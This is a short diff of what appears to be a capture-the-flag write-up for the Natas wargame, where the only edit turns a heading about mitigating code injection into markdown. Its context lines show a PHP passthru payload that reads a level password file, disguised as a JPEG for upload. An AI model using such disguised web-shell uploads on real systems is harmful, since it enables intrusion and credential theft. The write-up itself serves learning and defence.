@@ -10,7 +10,7 @@ This level was similar to the previous one but they actually added the checks fo
 └─$ echo "<?php passthru('cat /etc/natas_webpass/natas14'); ?>" > file.jpg
 └─$ hexeditor -b file.jpg
 
-How to actually mitigate code injections?
+# How to actually mitigate code injections?
 
 After actually seeing how easy it is to exploit code injection I was wondering how to actually protect yourself against them. This is specifically related to PHP based applications since I’ve been mainly tinkering with those so some of these points may be slightly outdated:
 
